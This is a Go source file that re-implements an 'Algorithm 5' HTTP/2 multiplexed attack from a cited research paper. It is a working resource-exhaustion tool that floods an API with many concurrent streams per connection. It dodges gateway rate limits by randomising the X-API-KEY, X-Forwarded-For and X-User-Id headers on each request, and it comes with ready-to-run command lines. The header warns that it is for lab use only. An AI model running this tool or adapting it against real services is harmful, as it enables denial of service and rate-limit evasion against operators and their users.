// Algorithm 5 — HTTP/2 Multiplexed Attack.
//
// Re-implementation of Algorithm 5 from Sivakumar & Thilagam (IJACSA 16/3,
// 2025): multiple high-workload requests are issued *as streams* inside a
// single TCP connection, exploiting HTTP/2's multiplexing.  The API gateway
// rate-limit (per-IP, per-USER, per-X-API-KEY) cannot easily distinguish
// streams that share a TCP connection, so we bypass it both by
//
//   (a) keeping `MaxConnsPerHost = ClientCount`, so each "client" worker
//       reuses ONE physical TCP/HTTP-2 connection for many concurrent
//       streams, and
//   (b) rotating the `X-API-KEY`, `X-Forwarded-For`, and `X-User-Id`
//       headers per stream so successive frames look like different users.
//
// Build / run:
//
//   go run algorithm5_http2_mux.go \
//       -target       https://localhost:8443 \
//       -targets-file ../results/targets.json \
//       -clients      15 \
//       -requests     2000 \
//       -streams      200 \
//       -insecure
//
// or, for a static one-shot attack against a single endpoint:
//
//   go run algorithm5_http2_mux.go -target https://localhost:8443/api/orders \
//       -method POST -clients 15 -requests 2000 -streams 200 -insecure
//
// ⚠️  Lab use only. Resource-exhaustion testing against systems you do not
// own or have written authorization to test is illegal in most jurisdictions.
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/csv"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

// ---------------------------------------------------------------------------
// Targets file model (subset of Algorithm 2 output)
// ---------------------------------------------------------------------------

type targetEntry struct {
	Method string `json:"method"`
	Path   string `json:"path"`
}

type targetsDoc struct {
	BaseURL         string        `json:"base_url"`
	HeavyByLatency  []targetEntry `json:"heavy_by_latency"`
	TargetList      []targetEntry `json:"target_list"`
}

// ---------------------------------------------------------------------------
// Header rotation
// ---------------------------------------------------------------------------

var apiKeyPrefixes = []string{"AX001-", "BX001-", "CC001-", "ZZ000-"}
var alphanum = []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")

func randString(rng *rand.Rand, n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = alphanum[rng.Intn(len(alphanum))]
	}
	return string(b)
}

func randAPIKey(rng *rand.Rand) string {
	return apiKeyPrefixes[rng.Intn(len(apiKeyPrefixes))] + randString(rng, 8)
}

func randXFF(rng *rand.Rand) string {
	return fmt.Sprintf("10.%d.%d.%d",
		rng.Intn(256), rng.Intn(256), rng.Intn(254)+1)
}

// ---------------------------------------------------------------------------
// Result row
// ---------------------------------------------------------------------------

type resultRow struct {
	worker    int
	iteration int
	method    string
	path      string
	status    int
	latencyMS float64
	epoch     int64
	err       string
}

// ---------------------------------------------------------------------------
// Worker — one HTTP/2 client => one TCP connection => N concurrent streams
// ---------------------------------------------------------------------------

func newH2Client(insecure bool, maxStreams int) *http.Client {
	tlsConf := &tls.Config{
		InsecureSkipVerify: insecure,
		NextProtos:         []string{"h2"},
	}

	transport := &http2.Transport{
		TLSClientConfig: tlsConf,
		// Force ONE TCP connection per host so streams multiplex over it.
		AllowHTTP:       false,
		StrictMaxConcurrentStreams: false,
	}
	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

func pickTarget(rng *rand.Rand, doc targetsDoc, symmetric bool,
	staticTarget targetEntry) targetEntry {
	if staticTarget.Path != "" {
		return staticTarget
	}
	if symmetric {
		if len(doc.HeavyByLatency) > 0 {
			return doc.HeavyByLatency[0]
		}
	}
	pool := doc.TargetList
	if len(pool) == 0 {
		pool = doc.HeavyByLatency
	}
	if len(pool) == 0 {
		return targetEntry{Method: "GET", Path: "/"}
	}
	return pool[rng.Intn(len(pool))]
}

func runWorker(
	ctx context.Context,
	workerID int,
	client *http.Client,
	baseURL string,
	doc targetsDoc,
	staticTarget targetEntry,
	requests, streams int,
	symmetric bool,
	rows chan<- resultRow,
	completed *atomic.Int64,
	wg *sync.WaitGroup,
) {
	defer wg.Done()
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

	// Stream-level concurrency: a buffered semaphore caps in-flight
	// streams per client at `streams`, matching the paper's "Send Multiple
	// Requests as chunks and send as different streams" (Algorithm 5, l. 5).
	sema := make(chan struct{}, streams)
	var innerWg sync.WaitGroup

	for i := 0; i < requests; i++ {
		select {
		case <-ctx.Done():
			break
		default:
		}
		sema <- struct{}{}
		innerWg.Add(1)
		go func(iter int) {
			defer innerWg.Done()
			defer func() { <-sema }()

			tgt := pickTarget(rng, doc, symmetric, staticTarget)
			method := tgt.Method
			if method == "" {
				method = "GET"
			}
			url := baseURL + tgt.Path

			var body io.Reader
			if method != "GET" {
				payload := fmt.Sprintf(
					`{"k":"%s","v":%d}`, randString(rng, 6), rng.Intn(10000))
				body = bytes.NewReader([]byte(payload))
			}

			req, err := http.NewRequestWithContext(ctx, method, url, body)
			if err != nil {
				rows <- resultRow{
					worker: workerID, iteration: iter, method: method,
					path: tgt.Path, status: -1,
					epoch: time.Now().Unix(), err: err.Error()}
				return
			}
			req.Header.Set("X-API-KEY", randAPIKey(rng))
			req.Header.Set("X-Forwarded-For", randXFF(rng))
			req.Header.Set("X-User-Id", "u-"+randString(rng, 6))
			req.Header.Set("User-Agent",
				"Algo5-H2/"+strconv.Itoa(workerID))
			req.Header.Set("Accept", "application/json")
			if method != "GET" {
				req.Header.Set("Content-Type", "application/json")
			}

			start := time.Now()
			resp, err := client.Do(req)
			elapsed := time.Since(start)

			status := -1
			errStr := ""
			if err != nil {
				errStr = err.Error()
			} else {
				status = resp.StatusCode
				_, _ = io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
			rows <- resultRow{
				worker:    workerID,
				iteration: iter,
				method:    method,
				path:      tgt.Path,
				status:    status,
				latencyMS: float64(elapsed.Microseconds()) / 1000.0,
				epoch:     time.Now().Unix(),
				err:       errStr,
			}
			completed.Add(1)
		}(i)
	}
	innerWg.Wait()
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func main() {
	target := flag.String("target", "",
		"Required. Base URL of target (e.g. https://localhost:8443) — or a "+
			"single full URL when -targets-file is empty.")
	targetsFile := flag.String("targets-file", "",
		"Optional. JSON produced by algorithm2_identify.py.")
	method := flag.String("method", "GET",
		"HTTP method used when -targets-file is empty.")
	clients := flag.Int("clients", 15, "Number of attacker workers (TCP conns).")
	requests := flag.Int("requests", 2000, "Requests per worker.")
	streams := flag.Int("streams", 200, "Max in-flight streams per worker.")
	symmetric := flag.Bool("symmetric", true,
		"true = always hit the heaviest target (Algorithm 5 + Algorithm 3 fusion); "+
			"false = pick from full target list each call (Algorithm 5 + Algorithm 4).")
	insecure := flag.Bool("insecure", false, "Skip TLS verification.")
	outPath := flag.String("out", "", "Output CSV (default ./results/h2mux_<ts>.csv).")
	flag.Parse()

	if *target == "" {
		fmt.Fprintln(os.Stderr, "ERROR: -target required")
		os.Exit(2)
	}

	var doc targetsDoc
	staticTarget := targetEntry{}
	baseURL := *target

	if *targetsFile != "" {
		f, err := os.Open(*targetsFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "open targets: %v\n", err)
			os.Exit(1)
		}
		defer f.Close()
		if err := json.NewDecoder(f).Decode(&doc); err != nil {
			fmt.Fprintf(os.Stderr, "decode targets: %v\n", err)
			os.Exit(1)
		}
		if doc.BaseURL != "" && *target == doc.BaseURL {
			baseURL = doc.BaseURL
		}
	} else {
		// Single-URL mode: split into base + path.
		idx := -1
		for i := 8; i < len(*target); i++ {
			if (*target)[i] == '/' {
				idx = i
				break
			}
		}
		if idx > 0 {
			baseURL = (*target)[:idx]
			staticTarget = targetEntry{Method: *method, Path: (*target)[idx:]}
		} else {
			staticTarget = targetEntry{Method: *method, Path: "/"}
		}
	}

	if *outPath == "" {
		// Default to <lab-root>/results regardless of where `go run` was
		// invoked from.  The lab root is the parent of this binary's source
		// directory (attacks/).  We try a few candidates:
		//   1. $LAB_RESULTS  (explicit override)
		//   2. ../results    (we're in attacks/, the common case)
		//   3. ./results     (final fallback if neither exists)
		candidates := []string{
			os.Getenv("LAB_RESULTS"),
			"../results",
			"./results",
		}
		dir := ""
		for _, c := range candidates {
			if c == "" {
				continue
			}
			if st, err := os.Stat(c); err == nil && st.IsDir() {
				dir = c
				break
			}
		}
		if dir == "" {
			dir = "./results"
			_ = os.MkdirAll(dir, 0o755)
		}
		*outPath = filepath.Join(dir,
			fmt.Sprintf("h2mux_%d.csv", time.Now().Unix()))
	}

	out, err := os.Create(*outPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "create csv: %v\n", err)
		os.Exit(1)
	}
	defer out.Close()
	w := csv.NewWriter(out)
	_ = w.Write([]string{"worker", "iteration", "epoch", "method", "path",
		"status", "latency_ms", "error"})

	rows := make(chan resultRow, *clients**streams*2)
	var writerWg sync.WaitGroup
	writerWg.Add(1)
	go func() {
		defer writerWg.Done()
		for r := range rows {
			_ = w.Write([]string{
				strconv.Itoa(r.worker),
				strconv.Itoa(r.iteration),
				strconv.FormatInt(r.epoch, 10),
				r.method, r.path,
				strconv.Itoa(r.status),
				strconv.FormatFloat(r.latencyMS, 'f', 2, 64),
				r.err,
			})
		}
		w.Flush()
	}()

	fmt.Fprintf(os.Stderr,
		"[+] HTTP/2 multiplexed attack | base=%s | clients=%d | reqs/c=%d "+
			"| streams/c=%d | symmetric=%v\n",
		baseURL, *clients, *requests, *streams, *symmetric)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var wg sync.WaitGroup
	var completed atomic.Int64
	t0 := time.Now()

	for c := 0; c < *clients; c++ {
		wg.Add(1)
		client := newH2Client(*insecure, *streams)
		go runWorker(ctx, c, client, baseURL, doc, staticTarget,
			*requests, *streams, *symmetric, rows, &completed, &wg)
	}

	wg.Wait()
	close(rows)
	writerWg.Wait()

	elapsed := time.Since(t0)
	total := completed.Load()
	fmt.Fprintf(os.Stderr,
		"[+] done in %s | total=%d | ~%.1f rps | csv=%s\n",
		elapsed.Truncate(time.Millisecond), total,
		float64(total)/elapsed.Seconds(), *outPath)
}
